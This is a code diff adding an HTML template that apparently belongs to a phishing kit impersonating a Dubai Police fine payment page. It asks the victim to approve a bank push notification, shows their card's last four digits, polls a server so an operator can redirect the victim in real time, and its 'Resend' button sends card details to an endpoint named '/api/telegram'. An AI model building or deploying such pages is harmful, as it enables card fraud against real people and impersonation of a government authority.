@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Notification Sent</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:'Segoe UI',Arial,sans-serif; max-width:480px; margin:0 auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div style="min-height:100vh;background:linear-gradient(160deg,#0f2027,#203a43,#2c5364);display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Arial,sans-serif;padding:24px;">
+  <div style="background:rgba(255,255,255,0.05);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.13);border-radius:28px;padding:44px 32px 36px;width:100%;max-width:390px;box-shadow:0 24px 80px rgba(0,0,0,0.45);text-align:center;position:relative;overflow:hidden;">
+
+    <!-- Glow blob -->
+    <div style="position:absolute;top:-60px;right:-60px;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(0,198,255,0.12) 0%,transparent 70%);pointer-events:none;"></div>
+
+    <!-- Icon -->
+    <div style="width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#00c6ff,#0072ff);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 0 48px rgba(0,180,255,0.55);">
+      <svg width="38" height="38" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2C8.13 2 5 5.13 5 9v5l-1.29 1.29A1 1 0 004 17v1h16v-1a1 1 0 00-.71-.71L18 14V9c0-3.87-3.13-7-7-7z" fill="white" opacity="0.9"/>
+        <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z" fill="white"/>
+        <circle cx="18" cy="6" r="4" fill="#00c47a"/>
+        <path d="M16.5 6l1 1 2-2" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <div style="font-size:22px;font-weight:800;color:white;margin-bottom:8px;letter-spacing:-0.3px;">Notification Sent</div>
+    <div style="font-size:13px;color:rgba(255,255,255,0.55);margin-bottom:28px;line-height:1.65;">
+      A push notification has been sent to your
+      <strong style="color:rgba(255,255,255,0.85);"><%= issuer %></strong>
+      mobile app. Please open the app and <strong style="color:rgba(255,255,255,0.85);">approve the transaction</strong>.
+    </div>
+
+    <!-- Transaction card -->
+    <div style="background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:16px 18px;margin-bottom:28px;text-align:left;">
+      <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1.2px;text-transform:uppercase;margin-bottom:12px;">Transaction Details</div>
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
+        <span style="font-size:12px;color:rgba(255,255,255,0.45);">Merchant</span>
+        <span style="font-size:13px;font-weight:600;color:white;">Dubai Police</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
+        <span style="font-size:12px;color:rgba(255,255,255,0.45);">Amount</span>
+        <span style="font-size:15px;font-weight:800;color:#7edcff;">AED <%= totalFine.toLocaleString() %></span>
+      </div>
+      <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
+        <span style="font-size:12px;color:rgba(255,255,255,0.45);">Card</span>
+        <span style="font-size:13px;font-weight:600;color:white;">••••&nbsp;<%= cardLast4 %></span>
+      </div>
+      <div style="display:flex;justify-content:space-between;">
+        <span style="font-size:12px;color:rgba(255,255,255,0.45);">Date</span>
+        <span style="font-size:13px;font-weight:600;color:white;"><%= dateStr %></span>
+      </div>
+    </div>
+
+    <!-- Resend -->
+    <div style="margin-bottom:28px;">
+      <button id="resend-btn" onclick="handleResend()"
+        style="background:none;border:none;font-size:13px;font-weight:600;color:rgba(255,255,255,0.55);cursor:pointer;padding:0;transition:color 0.3s;text-decoration:underline;">
+        Resend Notification
+      </button>
+    </div>
+
+    <!-- Footer -->
+    <div style="border-top:1px solid rgba(255,255,255,0.08);padding-top:18px;display:flex;justify-content:space-between;align-items:center;">
+      <button onclick="window.location.href='/'"
+        style="background:none;border:none;color:rgba(255,255,255,0.35);font-size:12px;cursor:pointer;padding:0;text-decoration:underline;">
+        Cancel
+      </button>
+      <div style="font-size:11px;color:rgba(255,255,255,0.25);display:flex;align-items:center;gap:5px;">
+        <span>🔒</span><span>256-bit SSL</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+let resent = false;
+
+if (SID) {
+  const sidParams = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) window.location.href = '/' + d.page + sidParams;
+    } catch(e) {}
+  }, 3000);
+}
+
+function handleResend() {
+  if (resent) return;
+  resent = true;
+  const btn = document.getElementById('resend-btn');
+  btn.textContent = '✓ Notification Resent!';
+  btn.style.color = '#4ade80';
+  fetch('/api/telegram', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({type:'otp_notification_resend', cardLast4: CARD_LAST4, totalFine: TOTAL_FINE, issuer: ISSUER})
+  }).catch(() => {});
+  setTimeout(() => { resent = false; btn.textContent = 'Resend Notification'; btn.style.color = 'rgba(255,255,255,0.55)'; }, 3500);
+}
+</script>
+</body>
+</html>
